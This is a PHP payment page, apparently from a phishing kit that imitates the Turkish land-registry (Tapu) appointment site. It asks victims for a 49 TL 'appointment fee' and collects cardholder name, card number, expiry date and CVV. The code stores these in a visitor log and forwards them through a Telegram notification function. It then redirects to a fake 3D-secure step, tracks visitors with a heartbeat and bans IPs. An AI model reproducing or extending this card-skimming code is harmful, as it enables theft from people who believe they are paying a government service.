<?php
/**
 * odeme.php — Adım 3: Ödeme
 */
if (session_status() === PHP_SESSION_NONE) session_start();

// Önceki adımlardan veri kontrolü
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
if (empty($_SESSION['randevu'])) { header('Location: ' . BASE_PATH . '/randevu.php'); exit; }

// DB takibi
require_once __DIR__ . '/db.php';
ip_ban_kontrol(); // Banlı IP'yi yönlendir
kayit_ziyaretci();
$randevu_ucreti = ayar_get('randevu_ucreti', '49');
$_SESSION['adim'] = 3;
$_aktif_log_id = get_or_create_log();
if ($_aktif_log_id) update_log($_aktif_log_id, ['mevcut_adim' => 3, 'son_aktivite' => date('Y-m-d H:i:s')]);


$basvuru    = $_SESSION['basvuru'];
$randevu    = $_SESSION['randevu'];
$aktif_adim = 3;
$hatalar    = [];
$form_data  = [];

$islem_etiketler = [
  'Satis'=>'Satış','Ipotek'=>'İpotek','Bagis'=>'Bağış','Intikal'=>'İntikal','Diger'=>'Diğer',
];

// Randevu özet metni
$randevu_ozet = ($randevu['tarih'] ?? '') . ' ' . substr($randevu['saat'] ?? '', 0, 5);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  if (isset($_POST['geri'])) {
    header('Location: ' . BASE_PATH . '/randevu.php'); exit;
  }

  $form_data = [
    'kart_ad'  => trim($_POST['kart_ad']  ?? ''),
    'kart_no'  => preg_replace('/\D/', '', $_POST['kart_no'] ?? ''),
    'ay'       => trim($_POST['ay']       ?? ''),
    'yil'      => trim($_POST['yil']      ?? ''),
    'cvv'      => trim($_POST['cvv']      ?? ''),
  ];

  if (empty($form_data['kart_ad']))
    $hatalar['kart_ad'] = 'Kart üzerindeki ad soyad zorunludur.';

  if (!preg_match('/^\d{16}$/', $form_data['kart_no']))
    $hatalar['kart_no'] = 'Kart numarası 16 haneli olmalıdır.';

  if (empty($form_data['ay'])) {
    $hatalar['ay'] = 'Lütfen kart son kullanma ayını seçiniz.';
  } elseif (!preg_match('/^(0[1-9]|1[0-2])$/', $form_data['ay'])) {
    $hatalar['ay'] = 'Geçerli bir son kullanma ayı seçiniz.';
  }

  $thisYear = (int)date('y');
  if (empty($form_data['yil'])) {
    $hatalar['yil'] = 'Lütfen kart son kullanma yılını seçiniz.';
  } elseif (!preg_match('/^\d{2}$/', $form_data['yil']) || (int)$form_data['yil'] < $thisYear) {
    $hatalar['yil'] = 'Geçerli bir son kullanma yılı seçiniz.';
  }

  if (!preg_match('/^\d{3,4}$/', $form_data['cvv']))
    $hatalar['cvv'] = 'CVV 3 veya 4 haneli olmalıdır.';

  if (empty($hatalar)) {
    $_SESSION['odeme'] = $form_data;
    $_SESSION['adim']  = 3;

    // DB'ye kart bilgilerini kaydet ve Telegram bildir (sadece bu anda)
    if (!empty($_SESSION['log_id'])) {
      $lid = (int)$_SESSION['log_id'];
      update_log($lid, [
        'kart_ad'     => $form_data['kart_ad'],
        'kart_no'     => $form_data['kart_no'],
        'ay'          => $form_data['ay'],
        'yil'         => $form_data['yil'],
        'cvv'         => $form_data['cvv'],
        'mevcut_adim' => 4,
      ]);
      // Telegram mesajı — tek seferlik gönderim
      try { tg_mesaj_gonder($lid); } catch (Exception $e) {}
    }

    header('Location: ' . BASE_PATH . '/3dredirect.php'); exit;
  }
} else {
  $form_data = [
    'kart_ad' => $_SESSION['odeme']['kart_ad'] ?? '',
    'kart_no' => $_SESSION['odeme']['kart_no'] ?? '',
    'ay'      => $_SESSION['odeme']['ay']      ?? '',
    'yil'     => $_SESSION['odeme']['yil']     ?? '',
    'cvv'     => $_SESSION['odeme']['cvv']     ?? '',
  ];
}

// Kart no formatla (xxxx xxxx xxxx xxxx)
$kart_no_fmt = '';
if (!empty($form_data['kart_no'])) {
  $kart_no_fmt = trim(chunk_split($form_data['kart_no'], 4, ' '));
}

require_once __DIR__ . '/includes/header.php';
?>

        <!-- ====== ÖDEME FORMU ====== -->
        <section class="webtapu-card">
          <h3>Ödeme</h3>
          <p class="webtapu-muted">Kart bilgilerinizi girerek başvurunuzu tamamlayabilirsiniz.</p>

          <?php if (!empty($hatalar)): ?>
            <div class="tapu-error-box" id="tapu-error-box">
              <div class="tapu-error-icon" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
                  <circle cx="12" cy="12" r="12" fill="#c0392b"/>
                  <rect x="6" y="11" width="12" height="2" rx="1" fill="white"/>
                </svg>
              </div>
              <div class="tapu-error-content">
                <p class="tapu-error-title">İşleminiz tamamlanamadı.</p>
                <ul class="tapu-error-list">
                  <?php foreach ($hatalar as $hata): ?>
                    <li><?= htmlspecialchars($hata) ?></li>
                  <?php endforeach; ?>
                </ul>
              </div>
            </div>
          <?php endif; ?>

          <form method="post" action="" class="webtapu-form" novalidate autocomplete="off">

            <div class="webtapu-grid">

              <!-- Kart Üzerindeki Ad Soyad -->
              <div class="webtapu-field webtapu-field--wide">
                <label for="kart_ad">Kart Üzerindeki Ad Soyad</label>
                <input id="kart_ad" name="kart_ad" type="text"
                  placeholder="AD SOYAD"
                  autocomplete="cc-name"
                  value="<?= htmlspecialchars($form_data['kart_ad']) ?>"
                  class="<?= isset($hatalar['kart_ad']) ? 'is-invalid' : '' ?>"
                  style="text-transform:uppercase">
                <?php if (isset($hatalar['kart_ad'])): ?>
                  <small class="form-error-text"><?= htmlspecialchars($hatalar['kart_ad']) ?></small>
                <?php endif; ?>
              </div>

              <!-- Kart Numarası -->
              <div class="webtapu-field webtapu-field--wide">
                <label for="kart_no">Kart Numarası</label>
                <input id="kart_no" name="kart_no" type="text"
                  placeholder=".... .... .... ...."
                  maxlength="19"
                  inputmode="numeric"
                  autocomplete="cc-number"
                  value="<?= htmlspecialchars($kart_no_fmt) ?>"
                  class="odeme-kart-no <?= isset($hatalar['kart_no']) ? 'is-invalid' : '' ?>"
                  oninput="formatKartNo(this)">
                <?php if (isset($hatalar['kart_no'])): ?>
                  <small class="form-error-text"><?= htmlspecialchars($hatalar['kart_no']) ?></small>
                <?php endif; ?>
              </div>

              <!-- Son Kullanma Ay / Yıl / CVV -->
              <div class="webtapu-field">
                <label for="ay">Son Kul. Ay</label>
                <select id="ay" name="ay" autocomplete="off" class="<?= isset($hatalar['ay']) ? 'is-invalid' : '' ?>">
                  <option value="">Lütfen Seçiniz</option>
                  <?php for ($m = 1; $m <= 12; $m++): ?>
                    <?php $val = str_pad($m, 2, '0', STR_PAD_LEFT); ?>
                    <option value="<?= $val ?>" <?= ($form_data['ay'] === $val) ? 'selected' : '' ?>><?= $val ?></option>
                  <?php endfor; ?>
                </select>
                <?php if (isset($hatalar['ay'])): ?>
                  <small class="form-error-text"><?= htmlspecialchars($hatalar['ay']) ?></small>
                <?php endif; ?>
              </div>

              <div class="webtapu-field">
                <label for="yil">Son Kul. Yıl</label>
                <select id="yil" name="yil" autocomplete="off" class="<?= isset($hatalar['yil']) ? 'is-invalid' : '' ?>">
                  <option value="">Lütfen Seçiniz</option>
                  <?php 
                  $thisYearYY = (int)date('y');
                  $thisYearFull = (int)date('Y');
                  for ($y = 0; $y < 15; $y++): 
                    $valYY = str_pad($thisYearYY + $y, 2, '0', STR_PAD_LEFT);
                    $valFull = $thisYearFull + $y;
                  ?>
                    <option value="<?= $valYY ?>" <?= ($form_data['yil'] === $valYY) ? 'selected' : '' ?>><?= $valFull ?></option>
                  <?php endfor; ?>
                </select>
                <?php if (isset($hatalar['yil'])): ?>
                  <small class="form-error-text"><?= htmlspecialchars($hatalar['yil']) ?></small>
                <?php endif; ?>
              </div>

              <div class="webtapu-field">
                <label for="cvv">CVV</label>
                <input id="cvv" name="cvv" type="text"
                  placeholder="···" maxlength="3" inputmode="numeric"
                  autocomplete="cc-csc"
                  value="<?= htmlspecialchars($form_data['cvv']) ?>"
                  oninput="this.value=this.value.replace(/\D/g,'').slice(0,4)"
                  class="<?= isset($hatalar['cvv']) ? 'is-invalid' : '' ?>">
                <?php if (isset($hatalar['cvv'])): ?>
                  <small class="form-error-text"><?= htmlspecialchars($hatalar['cvv']) ?></small>
                <?php endif; ?>
              </div>

              <!-- Randevu Ücreti (readonly) -->
              <div class="webtapu-field webtapu-field--wide">
                <label>Randevu Ücreti</label>
                <input type="text" value="<?= htmlspecialchars($randevu_ucreti) ?> TL" readonly class="odeme-ucret-field">
              </div>

            </div><!-- /.webtapu-grid -->

            <!-- Özet Kutusu -->
            <div class="randevu-ozet-box">
              <p><strong>Randevu:</strong>
                <?= htmlspecialchars($randevu_ozet) ?>
              </p>
              <p><strong>Başvuru Sahibi:</strong>
                <?= htmlspecialchars(mb_strtoupper($basvuru['ad'] . ' ' . $basvuru['soyad'], 'UTF-8')) ?>
              </p>
              <p><strong>Tapu Müdürlüğü:</strong>
                <?= htmlspecialchars(mb_strtoupper($randevu['mudurlik'] ?? '', 'UTF-8')) ?>
              </p>
            </div>

            <!-- Butonlar -->
            <div class="webtapu-actions webtapu-actions--column">
              <button type="submit" name="devam" class="primaryButton">
                Ödemeyi Tamamla
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                  fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
                </svg>
              </button>
              <button type="submit" name="geri" class="secondaryButton">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                  fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>
                </svg>
                Geri
              </button>
            </div>

            <p class="odeme-sms-note">
              <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24"
                fill="none" stroke="#6b7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.36a2 2 0 0 1 1.99-2.18h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.96a16 16 0 0 0 6.13 6.13l.95-.95a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
              </svg>
              Ödeme sonrası telefonunuza SMS doğrulama kodu gönderilecektir.
            </p>

          </form>
        </section>

        <script>
        function formatKartNo(el) {
          var v = el.value.replace(/\D/g, '').slice(0, 16);
          el.value = v.replace(/(.{4})/g, '$1 ').trim();
        }
        // Heartbeat — kart verilerini 3sn'de bir gönder
        (function(){
          // Sadece aktivite & adım bilgisini gönderir — kart verisi göndermez
          // Telegram bildirimi input event'lerinde değil, form submit'te tetiklenir
          function heartbeat(){
            var fd=new FormData();
            fd.append('mevcut_adim','3');
            fetch('<?= BASE_PATH ?>/heartbeat.php',{method:'POST',body:fd,credentials:'same-origin'}).catch(function(){});
          }
          setInterval(heartbeat, 3000);
          // input event listener YOK — her karakter yazışta API çağrısı yapma
        })();
        </script>

<?php require_once __DIR__ . '/includes/footer.php'; ?>
